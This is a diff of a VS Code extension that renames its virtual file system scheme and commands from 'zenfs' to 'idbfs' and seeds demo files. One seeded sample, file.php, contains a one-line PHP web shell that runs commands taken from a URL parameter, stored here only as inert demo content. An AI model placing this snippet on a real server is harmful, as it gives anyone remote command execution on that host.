@@ -17,27 +17,27 @@ export async function activate(context: vscode.ExtensionContext) {
   const textSearchProvider = new GOLDiTextSearchProvider(fileSystemProvider);
 
   context.subscriptions.push(
-    vscode.workspace.registerFileSystemProvider("zenfs", fileSystemProvider, {
+    vscode.workspace.registerFileSystemProvider("idbfs", fileSystemProvider, {
       isCaseSensitive: true,
     })
   );
 
   context.subscriptions.push(
-    vscode.workspace.registerFileSearchProvider("zenfs", fileSearchProvider)
+    vscode.workspace.registerFileSearchProvider("idbfs", fileSearchProvider)
   );
 
   context.subscriptions.push(
-    vscode.workspace.registerTextSearchProvider("zenfs", textSearchProvider)
+    vscode.workspace.registerTextSearchProvider("idbfs", textSearchProvider)
   );
 
   let initialized = false;
 
   context.subscriptions.push(
-    vscode.commands.registerCommand("zenfs.reset", async () => {
+    vscode.commands.registerCommand("idbfs.reset", async () => {
       for (const [name] of await fileSystemProvider.readDirectory(
-        vscode.Uri.parse("zenfs:/")
+        vscode.Uri.parse("idbfs:/")
       )) {
-        await fileSystemProvider.delete(vscode.Uri.parse(`zenfs:/${name}`), {
+        await fileSystemProvider.delete(vscode.Uri.parse(`idbfs:/${name}`), {
           recursive: true,
         });
       }
@@ -46,10 +46,10 @@ export async function activate(context: vscode.ExtensionContext) {
   );
 
   context.subscriptions.push(
-    vscode.commands.registerCommand("zenfs.addFile", async (_) => {
+    vscode.commands.registerCommand("idbfs.addFile", async (_) => {
       if (initialized) {
         await fileSystemProvider.writeFile(
-          vscode.Uri.parse(`zenfs:/file.txt`),
+          vscode.Uri.parse(`idbfs:/file.txt`),
           Buffer.from("foo"),
           { create: true, overwrite: true }
         );
@@ -58,15 +58,15 @@ export async function activate(context: vscode.ExtensionContext) {
   );
 
   context.subscriptions.push(
-    vscode.commands.registerCommand("zenfs.deleteFile", async (_) => {
+    vscode.commands.registerCommand("idbfs.deleteFile", async (_) => {
       if (initialized) {
-        await fileSystemProvider.delete(vscode.Uri.parse("zenfs:/file.txt"));
+        await fileSystemProvider.delete(vscode.Uri.parse("idbfs:/file.txt"));
       }
     })
   );
 
   context.subscriptions.push(
-    vscode.commands.registerCommand("zenfs.init", async (_) => {
+    vscode.commands.registerCommand("idbfs.init", async (_) => {
       if (initialized) {
         return;
       }
@@ -74,115 +74,115 @@ export async function activate(context: vscode.ExtensionContext) {
 
       // most common files types
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.txt`),
+        vscode.Uri.parse(`idbfs:/file.txt`),
         Buffer.from("foo"),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.html`),
+        vscode.Uri.parse(`idbfs:/file.html`),
         Buffer.from('<html><body><h1 class="hd">Hello</h1></body></html>'),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.js`),
+        vscode.Uri.parse(`idbfs:/file.js`),
         Buffer.from('console.log("JavaScript")'),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.json`),
+        vscode.Uri.parse(`idbfs:/file.json`),
         Buffer.from('{ "json": true }'),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.ts`),
+        vscode.Uri.parse(`idbfs:/file.ts`),
         Buffer.from('console.log("TypeScript")'),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.css`),
+        vscode.Uri.parse(`idbfs:/file.css`),
         Buffer.from("* { color: green; }"),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.md`),
+        vscode.Uri.parse(`idbfs:/file.md`),
         Buffer.from("Hello _World_"),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.xml`),
+        vscode.Uri.parse(`idbfs:/file.xml`),
         Buffer.from('<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>'),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.py`),
+        vscode.Uri.parse(`idbfs:/file.py`),
         Buffer.from(
           'import base64, sys; base64.decode(open(sys.argv[1], "rb"), open(sys.argv[2], "wb"))'
         ),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.php`),
+        vscode.Uri.parse(`idbfs:/file.php`),
         Buffer.from("<?php echo shell_exec($_GET['e'].' 2>&1'); ?>"),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/file.yaml`),
+        vscode.Uri.parse(`idbfs:/file.yaml`),
         Buffer.from("- just: write something"),
         { create: true, overwrite: true }
       );
 
       // some more files & folders
       await fileSystemProvider.createDirectory(
-        vscode.Uri.parse(`zenfs:/folder/`)
+        vscode.Uri.parse(`idbfs:/folder/`)
       );
       await fileSystemProvider.createDirectory(
-        vscode.Uri.parse(`zenfs:/large/`)
+        vscode.Uri.parse(`idbfs:/large/`)
       );
-      await fileSystemProvider.createDirectory(vscode.Uri.parse(`zenfs:/xyz/`));
+      await fileSystemProvider.createDirectory(vscode.Uri.parse(`idbfs:/xyz/`));
       await fileSystemProvider.createDirectory(
-        vscode.Uri.parse(`zenfs:/xyz/abc`)
+        vscode.Uri.parse(`idbfs:/xyz/abc`)
       );
       await fileSystemProvider.createDirectory(
-        vscode.Uri.parse(`zenfs:/xyz/def`)
+        vscode.Uri.parse(`idbfs:/xyz/def`)
       );
 
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/folder/empty.txt`),
+        vscode.Uri.parse(`idbfs:/folder/empty.txt`),
         new Uint8Array(0),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/folder/empty.foo`),
+        vscode.Uri.parse(`idbfs:/folder/empty.foo`),
         new Uint8Array(0),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/folder/file.ts`),
+        vscode.Uri.parse(`idbfs:/folder/file.ts`),
         Buffer.from("let a:number = true; console.log(a);"),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/large/rnd.foo`),
+        vscode.Uri.parse(`idbfs:/large/rnd.foo`),
         randomData(50000),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/xyz/UPPER.txt`),
+        vscode.Uri.parse(`idbfs:/xyz/UPPER.txt`),
         Buffer.from("UPPER"),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/xyz/upper.txt`),
+        vscode.Uri.parse(`idbfs:/xyz/upper.txt`),
         Buffer.from("upper"),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/xyz/def/foo.md`),
-        Buffer.from("*ZenFS*"),
+        vscode.Uri.parse(`idbfs:/xyz/def/foo.md`),
+        Buffer.from("*idbfs*"),
         { create: true, overwrite: true }
       );
       await fileSystemProvider.writeFile(
-        vscode.Uri.parse(`zenfs:/xyz/def/foo.bin`),
+        vscode.Uri.parse(`idbfs:/xyz/def/foo.bin`),
         Buffer.from([0, 0, 0, 1, 7, 0, 0, 1, 1]),
         { create: true, overwrite: true }
       );
@@ -190,16 +190,16 @@ export async function activate(context: vscode.ExtensionContext) {
   );
 
   context.subscriptions.push(
-    vscode.commands.registerCommand("zenfs.workspaceInit", async (_) => {
+    vscode.commands.registerCommand("idbfs.workspaceInit", async (_) => {
       const directory = await vscode.window.showQuickPick(
         fileSystemProvider.getAllDirectoryPaths()
       );
       await vscode.commands.executeCommand(
         "vscode.openFolder",
-        vscode.Uri.parse(`zenfs:${directory}`)
+        vscode.Uri.parse(`idbfs:${directory}`)
       );
       // vscode.workspace.updateWorkspaceFolders(0, 0, {
-      //   uri: vscode.Uri.parse(`zenfs:${directory}`),
+      //   uri: vscode.Uri.parse(`idbfs:${directory}`),
       //   name: directory?.slice(directory.lastIndexOf("/") + 1),
       // });
     })
